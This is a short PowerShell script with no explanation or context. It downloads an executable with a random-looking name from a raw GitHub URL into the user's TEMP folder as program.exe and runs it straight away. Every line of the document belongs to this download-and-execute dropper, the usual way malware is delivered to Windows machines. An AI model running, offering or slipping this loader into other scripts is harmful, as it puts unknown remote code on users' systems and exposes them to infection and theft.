$url = "https://raw.githubusercontent.com/fasa3e/pidoryapidor/refs/heads/main/lx3sxpi0z7ym4aqa.exe"
$output = "$env:TEMP\program.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
